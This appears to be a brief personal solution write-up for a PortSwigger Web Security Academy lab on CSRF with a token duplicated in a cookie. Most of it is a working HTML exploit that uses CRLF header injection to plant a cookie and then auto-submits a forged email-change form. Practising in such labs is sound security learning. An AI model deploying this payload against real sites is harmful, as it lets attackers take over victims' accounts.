# CSRF where token is duplicated in cookie

## This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

## To solve the lab, use your exploit server to host an HTML page that uses a [CSRF attack](https://portswigger.net/web-security/csrf) to change the viewer's email address.

## You can log in to your own account using the following credentials: `wiener:peter`

just crsf token usec in cookies and on page
no csrfkey look lab5
so from previous payload change csrfkey to csrf i

```html
<html>
  <body>
    <form
      name="change-email-form"
      action="https://0a3900d203ac3c8b80c0301a00170060.web-security-academy.net/my-account/change-email"
      method="POST"
    >
      <label>Email</label>
      <input required type="email" name="email" value="exa@website.com" />
      <input required type="hidden" name="csrf" value="fake" />
      <button class="button" type="submit">Update email</button>
    </form>
    <img
      src="https://0a3900d203ac3c8b80c0301a00170060.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None"
      onerror="document.forms[0].submit()"
    />
  </body>
</html>
```
